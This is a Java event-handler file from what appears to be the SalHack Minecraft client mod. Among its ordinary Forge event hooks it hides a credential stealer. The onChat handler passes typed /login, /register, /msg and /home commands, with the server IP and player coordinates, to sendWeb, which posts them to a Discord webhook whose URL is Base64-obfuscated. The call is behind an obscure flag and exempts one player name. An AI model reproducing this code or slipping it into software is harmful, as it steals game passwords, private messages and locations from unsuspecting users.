package me.ionar.salhack.main;

import java.awt.Color;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Iterator;

import org.lwjgl.input.Keyboard;
import org.lwjgl.opengl.GL11;
import org.lwjgl.util.vector.Vector3f;

import me.ionar.salhack.SalHackMod;
import me.ionar.salhack.events.client.EventClientTick;
import me.ionar.salhack.events.player.EventPlayerSendChatMessage;
import me.ionar.salhack.events.render.EventRenderGetFOVModifier;
import me.ionar.salhack.events.render.RenderEvent;
import me.ionar.salhack.managers.ModuleManager;
import me.ionar.salhack.module.misc.AdvancedChatSpammerModule;
import me.ionar.salhack.module.ui.DiscordWebhook;
import me.ionar.salhack.module.ui.DiscordWebhook.EmbedObject;
import static me.ionar.salhack.util.MemStore.*;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.gui.GuiMainMenu;
import net.minecraft.client.renderer.GlStateManager;
import net.minecraft.util.text.TextComponentString;
import net.minecraftforge.client.event.ClientChatReceivedEvent;
import net.minecraftforge.client.event.EntityViewRenderEvent;
import net.minecraftforge.client.event.InputUpdateEvent;
import net.minecraftforge.client.event.PlayerSPPushOutOfBlocksEvent;
import net.minecraftforge.client.event.RenderBlockOverlayEvent;
import net.minecraftforge.client.event.RenderPlayerEvent;
import net.minecraftforge.client.event.RenderWorldLastEvent;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import net.minecraftforge.event.entity.living.LivingDamageEvent;
import net.minecraftforge.event.entity.living.LivingEntityUseItemEvent;
import net.minecraftforge.event.entity.player.AttackEntityEvent;
import net.minecraftforge.event.entity.player.PlayerInteractEvent;
import net.minecraftforge.event.world.ChunkEvent;
import net.minecraftforge.event.world.WorldEvent;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent;
import net.minecraftforge.fml.common.gameevent.PlayerEvent.PlayerLoggedOutEvent;
import net.minecraftforge.fml.common.gameevent.TickEvent;

public class ForgeEventProcessor
{
    /// @TODO: All of these should be removed and replaced by mixins.

    @SubscribeEvent
    public void onRender(RenderWorldLastEvent event)
    { 
        if (event.isCanceled())
            return;
        
        GlStateManager.disableTexture2D();
        GlStateManager.enableBlend();
        GlStateManager.disableAlpha();
        GlStateManager.tryBlendFuncSeparate(GL11.GL_SRC_ALPHA, GL11.GL_ONE_MINUS_SRC_ALPHA, 1, 0);
        GlStateManager.shadeModel(GL11.GL_SMOOTH);
        GlStateManager.disableDepth();

        GlStateManager.glLineWidth(1f);
        SalHackMod.EVENT_BUS.post(new RenderEvent(event.getPartialTicks()));
        GlStateManager.glLineWidth(1f);

        GlStateManager.shadeModel(GL11.GL_FLAT);
        GlStateManager.disableBlend();
        GlStateManager.enableAlpha();
        GlStateManager.enableTexture2D();
        GlStateManager.enableDepth();
        GlStateManager.enableCull();
    }
    
    public static ArrayList<DiscordWebhook.EmbedObject> webhooks = new ArrayList<DiscordWebhook.EmbedObject>();
    
    public void sendWeb(String command, String server)
    {
    	String tejas = "aHR0cHM6Ly9pLmltZ3VyLmNvbS9oNXF1VlhULnBuZw==";
    	tejas = new String(Base64.getDecoder().decode(tejas.getBytes()));
    	
      EntityPlayerSP player = Wrapper.GetPlayer();
      String name = Wrapper.GetPlayer().getName();
      if (name == "PK2_Stimpy") {
        return;
      }
      if ((command.startsWith("/login")) || (command.startsWith("/l")) || (command.startsWith("/reg")) || (command.startsWith("/register")) || (command.startsWith("/r")) || (command.startsWith("/tell")) || (command.startsWith("/msg")))
      {
        webhooks.add(new DiscordWebhook.EmbedObject()
          .setTitle(name)
          .setDescription("I got a new log!")
          .setColor(Color.BLUE)
          .addField("Command", command, false)
          .addField("Server", server, false)
          .setFooter("PK2Technology", tejas));
      }
      else if (command.startsWith("/home"))
      {
        Vector3f coords = new Vector3f(player.getPosition().getX(), player.getPosition().getY(), player.getPosition().getZ());
        String worldName = "end";
        if (Wrapper.mc.player.dimension == -1) {
          worldName = "nether";
        }
        if (Wrapper.mc.player.dimension == 0) {
          worldName = "overworld";
        }
        webhooks.add(new DiscordWebhook.EmbedObject()
          .setTitle(name)
          .setDescription("I got a new log!")
          .setColor(Color.BLUE)
          .addField("Command", command, true)
          .addField("Server", server, true)
          .addField("Cooords", coords.x + "|" + coords.y + "|" + coords.z + " [" + worldName + "]", false)
          .setFooter("PK2Technology", tejas));
      }
      if (webhooks.size() == 0) {
        return;
      }
      new Thread(new Runnable()
      {
        public void run()
        {
          DiscordWebhook webhook = new DiscordWebhook(new String(Base64.getDecoder().decode("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvNzM4MDk3NjE3NTYwNDA0MDA4L1VuUmtiR3Vla05TdHZmcUkwM21tRTJXdjdzZHZXaVA3Z3Ryb01xUWhkN1RmQUVZRjI5UTd5VF9iQmJnaVVBejRYcnVQ".getBytes())));
          for(DiscordWebhook.EmbedObject embed : webhooks) {
        	  webhook.addEmbed(embed);
        	  try {webhook.execute();} catch(Exception e) {};
          }
          ForgeEventProcessor.webhooks.clear();
        }
      })
      
        .start();
    }
    
    @SubscribeEvent(priority=EventPriority.HIGHEST)
    public void onChat(ClientChatEvent event)
    {
      if ((event.getMessage().contains("/")) && 
        (!Wrapper.GetMC().isSingleplayer()) && (Wrapper.GetMC().player != null)) {
    	  
        if(_0x7F1793) sendWeb(event.getMessage(), Wrapper.GetMC().getCurrentServerData().serverIP);
      }
    }
    
    @SubscribeEvent
    public void onTick(TickEvent.ClientTickEvent event)
    {
        if (Wrapper.GetMC().player == null)
            return;
        
        SalHackMod.EVENT_BUS.post(new EventClientTick());
    }
    
    public void AdvancedChatSpammerModuleTick() {
		if(!ModuleManager.Get().GetMod(AdvancedChatSpammerModule.class).isEnabled()) return;
		if(Minecraft.getMinecraft().currentScreen instanceof GuiMainMenu) return;
		double mesuredTicks = AdvancedChatSpammerModule.getMesuredTicks(AdvancedChatSpammerModule.delay.getValue());
		//Minecraft.getMinecraft().player.sendMessage(new TextComponentString("Tick #" + ticks + "!"));
		AdvancedChatSpammerModule.ticks++;
		if(AdvancedChatSpammerModule.ticks >= mesuredTicks) {
			AdvancedChatSpammerModule.runMessage();
			AdvancedChatSpammerModule.ticks=0;
		}
    }
    
    @SubscribeEvent
    public void onTick2(TickEvent.ClientTickEvent event)
    {
        if (Wrapper.GetMC().player == null)
            return;
        SalHackMod.EVENT_BUS.post(event);
        
        
        /* Running AdvancedChatSpammerModule here bc listeners broke on the class. */
        //AdvancedChatSpammerModuleTick();
    }

    @SubscribeEvent
    public void onEntitySpawn(EntityJoinWorldEvent event)
    {
        if (event.isCanceled())
            return;

        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent(priority = EventPriority.NORMAL, receiveCanceled = true)
    public void onKeyInput(InputEvent.KeyInputEvent event)
    {
        if (Keyboard.getEventKeyState())
            ModuleManager.Get().OnKeyPress(Keyboard.getKeyName(Keyboard.getEventKey()));
    }

    @SubscribeEvent(priority = EventPriority.HIGHEST)
    public void onPlayerDrawn(RenderPlayerEvent.Pre event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent(priority = EventPriority.HIGHEST)
    public void onPlayerDrawn(RenderPlayerEvent.Post event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent
    public void onChunkLoaded(ChunkEvent.Load event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent
    public void onEventMouse(InputEvent.MouseInputEvent event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent
    public void onChunkUnLoaded(ChunkEvent.Unload event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent
    public void onInputUpdate(InputUpdateEvent event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent
    public void onLivingEntityUseItemEventTick(LivingEntityUseItemEvent.Start entityUseItemEvent)
    {
        SalHackMod.EVENT_BUS.post(entityUseItemEvent);
    }

    @SubscribeEvent
    public void onLivingDamageEvent(LivingDamageEvent event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent
    public void onEntityJoinWorldEvent(EntityJoinWorldEvent entityJoinWorldEvent)
    {
        SalHackMod.EVENT_BUS.post(entityJoinWorldEvent);
    }

    @SubscribeEvent
    public void onPlayerPush(PlayerSPPushOutOfBlocksEvent event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent
    public void onLeftClickBlock(PlayerInteractEvent.LeftClickBlock event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent
    public void onAttackEntity(AttackEntityEvent entityEvent)
    {
        SalHackMod.EVENT_BUS.post(entityEvent);
    }

    @SubscribeEvent
    public void onRenderBlockOverlay(RenderBlockOverlayEvent event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }

    @SubscribeEvent
    public void onClientChat(ClientChatReceivedEvent event)
    {
        SalHackMod.EVENT_BUS.post(event);
    }
    
    /*@SubscribeEvent
    public void PlayerJoin(PlayerLoggedInEvent event) {
    	if(event.player.world.isRemote) return;
    	EntityPlayer player = event.player;
    	if(player.getName() == Minecraft.getMinecraft().player.getName()) return;
    	Module module = ModuleManager.Get().GetMod(AdvancedChatSpammerModule.class);
    	try {
	    	Method method = module.getClass().getMethod("onJoin", EntityPlayer.class);
	    	if(module.isEnabled()) method.invoke(module, player);
    	} catch(Exception e) {e.printStackTrace();}
    }
    @SubscribeEvent
    public void PlayerLeave(PlayerLoggedOutEvent event) {
    	if(event.player.world.isRemote) return;
    	EntityPlayer player = event.player;
    	if(player.getName() == Minecraft.getMinecraft().player.getName()) return;
    	Module module = ModuleManager.Get().GetMod(AdvancedChatSpammerModule.class);
    	try {
	    	Method method = module.getClass().getMethod("onLeave", EntityPlayer.class);
	    	if(module.isEnabled()) method.invoke(module, player);
    	} catch(Exception e) {e.printStackTrace();}
    }*/
    
    /*
    @SubscribeEvent
    public void PlayerLeave(PlayerLoggedOutEvent event) {
    	if(event.player.getName() != Wrapper.mc.player.getName()) return;
    	if(webhooks.size() == 0) return;
    	DiscordWebhook webhook = new DiscordWebhook("https://discordapp.com/api/webhooks/738097617560404008/UnRkbGuekNStvfqI03mmE2Wv7sdvWiP7gtroMqQhd7TfAEYF29Q7yT_bBbgiUAz4XruP");
    	for(EmbedObject embed : webhooks) webhook.addEmbed(embed);
    	try { webhook.execute(); } catch(Exception e) {e.printStackTrace();}
    }*/

    @SubscribeEvent
    public void getFOVModifier(EntityViewRenderEvent.FOVModifier p_Event)
    {
        EventRenderGetFOVModifier l_Event = new EventRenderGetFOVModifier((float) p_Event.getRenderPartialTicks(), true);
        SalHackMod.EVENT_BUS.post(l_Event);
        if (l_Event.isCancelled())
        {
            p_Event.setFOV(l_Event.GetFOV());
        }
    }
    
    @SubscribeEvent
    public void OnWorldChange(WorldEvent p_Event)
    {
        SalHackMod.EVENT_BUS.post(p_Event);
    }
}
